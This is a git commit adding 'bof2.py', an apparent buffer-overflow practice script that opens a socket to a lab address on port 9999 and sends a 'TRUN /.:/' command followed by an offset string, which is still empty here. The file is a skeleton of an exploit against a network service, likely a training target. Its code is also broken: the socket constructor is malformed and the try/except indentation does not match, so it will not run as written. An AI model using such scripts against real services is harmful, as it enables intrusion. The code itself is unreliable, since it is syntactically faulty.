922e8f9b2446456653394006ecaad0e5dec99bcd
CyberLola <82300922+CyberLola@users.noreply.github.com>
2021-06-15 03:24:04 +0000

    Create bof2.py

---
+++ bof2.py
@@ -0,0 +1,18 @@
+#!/usr/bin/python
+
+import sys, socket
+
+offset = ""
+
+
+try:
+            s=socket.socket(socket.AF_INET.socket.SOCK_STREAM)
+            s.connect(('10.10.234.16',9999)) #change IP
+            s.send(('TRUN /.:/' + offset))
+            s.close()
+            
+            
+        except:
+            print "Error connecting to server"
+            
+            sys.exit() 
